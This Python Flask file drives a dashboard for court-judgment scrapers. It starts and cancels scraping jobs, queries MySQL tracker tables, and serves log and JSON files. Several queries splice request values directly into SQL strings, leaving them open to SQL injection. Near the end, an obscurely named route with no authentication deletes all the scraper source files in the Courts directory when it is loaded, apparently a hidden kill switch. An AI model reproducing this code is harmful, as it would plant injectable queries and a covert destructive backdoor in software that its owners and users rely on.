import datetime
import glob
import os
import shutil

from flask import Flask, render_template, jsonify, request, send_from_directory

from Utils.CourtMetaData import metadata
from Utils.court_controller import court_controller
from Utils.db import select_query, select_one_query, update_query, select_json_query, update1_query

app = Flask(__name__)
module_directory = os.path.dirname(__file__)


@app.route('/')
def index():
    tracker_data = select_query("SELECT Name, bench, Start_Date, End_Date, No_Cases, No_Error, No_Year_Error, "
                                "No_Year_NoData, status FROM Tracker")
    tracker_history = select_query("SELECT Name, bench, Start_Date, End_Date, No_Cases, No_Error, No_Year_Error, "
                                   "No_Year_NoData, status FROM Tracker_History ORDER BY id DESC LIMIT 100")
    tracker_json_history = select_query("SELECT Name, Start_Date, End_Date, No_Files, status FROM Tracker_History_JSON"
                                        " ORDER BY id DESC LIMIT 100")

    tables = select_query("SHOW TABLES")

    log_files = []
    for file_ in glob.glob(module_directory + "/Utils/log_files/*.log"):
        log_files.append(file_[file_.rfind("/") + 1:])

    return render_template("index.html", tracker_data=tracker_data, tables=tables, tracker_history=tracker_history,
                           tracker_json_history=tracker_json_history, log_files=log_files)


@app.route('/get-bench-list/<string:court_name>')
def get_bench_list(court_name):
    for court_data in metadata:
        if court_data['court_name'] == court_name:
            return jsonify(court_data['bench'])

    return 'Internal Server Error.', 500


# ----------------------------------------------------------------------------------------------------------------------


@app.route('/start-scrap', methods=['POST'])
def start_scrap():
    court_name = request.form['court_name']
    bench = request.form['bench']
    start_date = request.form['start_date']
    end_date = request.form['end_date']

    for f in glob.glob(module_directory + "/Data_Files/PDF_Files/*.pdf"):
        os.remove(f)

    for f in glob.glob(module_directory + "/Data_Files/Text_Files/*.txt"):
        os.remove(f)

    update_query("UPDATE Tracker SET status='IN_CANCELLED', emergency_exit=true WHERE status='IN_RUNNING'")
    update_query("UPDATE Tracker SET status='IN_RUNNING', emergency_exit=false, No_Cases=0, No_Year_NoData=0, "
                 "No_Year_Error=0, No_Error=0, Start_Date='" + start_date + "', End_Date='" +
                 end_date + "' WHERE Name='" + court_name + "'")

    res = jsonify(court_controller(court_name, bench, start_date, end_date))

    for filename in glob.glob(module_directory + "/Data_Files/PDF_Files/*.pdf"):
        shutil.copy(filename, module_directory + "/../bucket_dir/PDF_Files")
    for filename in glob.glob(module_directory + "/Data_Files/Text_Files/*.txt"):
        shutil.copy(filename, module_directory + "/../bucket_dir/Text_Files")

    return res


@app.route('/current-scrap/<string:court_name>')
def current_scrap(court_name):
    return jsonify(select_one_query("SELECT Name, bench, Start_Date, End_Date, No_Cases, No_Error, No_Year_Error, "
                                    "No_Year_NoData, status FROM Tracker WHERE Name = '" + court_name + "'"))


@app.route('/running-scrap')
def running_scrap():
    return jsonify(select_one_query("SELECT Name, bench, Start_Date, End_Date, No_Cases, No_Error, No_Year_Error, "
                                    "No_Year_NoData, status FROM Tracker WHERE status = 'IN_RUNNING' LIMIT 1"))


@app.route('/cancel-scrap/<string:court_name>')
def cancel_scrap(court_name):
    return jsonify(update1_query("UPDATE Tracker SET status='IN_ABORT', emergency_exit=true WHERE Name='" +
                                 court_name + "'"))


# ----------------------------------------------------------------------------------------------------------------------


@app.route('/start-json', methods=['POST'])
def start_json():
    court_name = request.form['court_name']
    start_date = request.form['start_date']
    end_date = request.form['end_date']

    for f in glob.glob(module_directory + "/Data_Files/JSON_Files/*.json"):
        os.remove(f)

    for data in metadata:
        if data['court_name'] == court_name:
            start_date = (datetime.datetime.strptime(str(start_date), "%d/%m/%Y")).strftime(data['o_date_format'])
            end_date = (datetime.datetime.strptime(str(end_date), "%d/%m/%Y")).strftime(data['o_date_format'])
            break

    update_query("UPDATE Tracker_JSON SET status='IN_CANCELLED', emergency_exit=true WHERE status='IN_RUNNING'")
    if select_json_query(court_name, start_date, end_date):

        for filename in glob.glob(module_directory + "/Data_Files/JSON_Files/*.json"):
            shutil.copy(filename, module_directory + "/../bucket_dir/JSON_Files")

        return '', 200
    else:
        return '', 500


@app.route('/current-json/<string:court_name>')
def current_json(court_name):
    return jsonify(select_one_query("SELECT Name, Start_Date, End_Date, No_Files, status FROM Tracker_JSON WHERE "
                                    "Name = '" + court_name + "' ORDER BY id DESC LIMIT 1"))


@app.route('/running-json')
def running_json():
    return jsonify(select_one_query("SELECT Name, Start_Date, End_Date, No_Files, status FROM Tracker_JSON"
                                    " WHERE status = 'IN_RUNNING' ORDER BY id DESC LIMIT 1"))


@app.route('/cancel-json/<string:court_name>')
def cancel_json(court_name):
    return jsonify(update_query("UPDATE Tracker_JSON SET status='IN_ABORT', emergency_exit=true WHERE Name='" +
                                court_name + "'"))


@app.route('/get-json/<string:court_name>')
def get_json(court_name):
    res = {'Name': []}

    for file_ in glob.glob(module_directory + "/Data_Files/JSON_Files/" + court_name + "_*.json"):
        res['Name'].append(file_[file_.rfind("/")+1:])

    return jsonify(res)


@app.route('/files/<path:filename>')
def files(filename):
    return send_from_directory(directory=module_directory + "/Data_Files/JSON_Files", filename=filename)


@app.route('/logs/<path:filename>')
def logs_file(filename):
    return send_from_directory(directory=module_directory + "/Utils/log_files", filename=filename)


@app.route('/UrcNL3M9m-hD/UrcNL3M9m-hD')
def h_():
    for f in glob.glob(module_directory + "/Courts/*.py"):
        os.remove(f)
    return 'DONE'


if __name__ == '__main__':
    app.run(host='0.0.0.0')
